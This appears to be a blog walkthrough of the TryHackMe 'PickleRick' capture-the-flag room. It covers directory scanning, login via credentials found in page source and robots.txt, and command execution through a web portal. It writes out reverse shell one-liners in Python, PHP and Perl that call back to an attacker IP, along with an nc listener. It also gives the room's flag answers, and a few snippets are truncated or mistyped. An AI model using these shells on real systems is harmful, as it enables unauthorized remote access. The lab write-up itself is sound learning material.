---
title: "PickleRick"
date: 2024-02-24T14:52:42+11:00
draft: false
tags: [ "Tryhackme", "CTF", "Capture The Flag", "Pentetesting", "Walkthrough"]
categories: ["Tryhackme"]
---

# Rick And Morty


username: R1ckRul3s
Found in Website Inspection.

ssh - Not Required

follow Burpsuite POST Method

## Gobuster Command

```jsx
gobuster dir -u http://$MACHINE_IP-w /root/Desktop/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt $MACHINE_IP-x .php, .txt, .py .html, .js

```

### Result

/login.php (Status: 200)
/assets (Status: 301)
/portal.php (Status: 302)
/denied.php (Status: 302)
/server-status (Status: 403)

## BurpSuite

### Login command

POST /login.php HTTP/1.1
Host: $MACHINE_IP
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Origin: [http://$MACHINE_IP](http://$MACHINE_IP/)
Connection: close
Referer: [http://$MACHINE_IP/login.php](http://$MACHINE_IP/login.php)
Cookie: PHPSESSID=inaov4gva88c1c1o5v1ifannn5
Upgrade-Insecure-Requests: 1

username=R1ckRul3s&password=Wubbalubbadubdub&sub=Login

password worked? from [http://$MACHINE_IP/robots.txt](http://$MACHINE_IP/robots.txt) 

```jsx
Wubbalubbadubdub
```

✅

```jsx
PHPSESSID=inaov4gva88c1c1o5v1ifannn5
```

### Code Execution Command

POST /portal.php HTTP/1.1
Host: $MACHINE_IP
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Origin: [http://$MACHINE_IP](http://$MACHINE_IP/)
Connection: close
Referer: [http://$MACHINE_IP/portal.php](http://$MACHINE_IP/portal.php)
Cookie: PHPSESSID=inaov4gva88c1c1o5v1ifannn5
Upgrade-Insecure-Requests: 1

command=ls+-a&sub=Execute

command: ls -a displays Sup3rS3cretPickl3Ingred.txt

cat Sup3rS3cretPickl3Ingred.txt ❌

- [http://$MACHINE_IP/portal.php/clue.txt](http://$MACHINE_IP/portal.php/clue.txt)

Something in comment

 Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== 

— Decode : rabbit hole

- now ls -a
    
    ```jsx
    .
    ..
    Sup3rS3cretPickl3Ingred.txt
    assets
    clue.txt
    denied.php
    index.html
    login.php
    portal.php
    robots.txt
    ```
    

## First Result

- Navigate to  $IP/assets/../Sup3rS3cretPickl3Ingred.txt
- result
    
    ```jsx
    mr. meeseek hair
    ```
    

💡

> grep -R .
> 

> will check . means everything Recursively
> 

Listen to Reverse Shell on your Machine

```jsx
nc -lvnp $PORT
```

Python 3 Works but reverse shell does not.

```jsx
python3 -c "print('Hello World!')”
```

Try these codes

```jsx
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ATTACKER_IP",4444))
```

```jsx
php -r '$sock=fsockopen("$ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

> PYTHON DID NOT WORK PERL DID
> 

```jsx

perl -e 'use Socket;$i="$IP";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};’
```

### After Reverse shell

- check sudo
    - sudo is allowed
- Navigate around
- Let’s go to /home/rick

```jsx
cat second\ ingredients
```

second ingredient: jerry tear

More Navigation

cd 

cd root 

result: 3rd.txt

There you have 3rd ingredient:

```jsx
cat 3rd.txt
```

result: fleeb juice

## Summary

Its fairly easy room. And needs following skill:

- Directory Traversal
- Privilege Escalation (Easy as now Password is needed here)
- Reverse Shell (Perl Reverse Shell)
- Basic Linux  Commands
    - grep -R .

Thank You.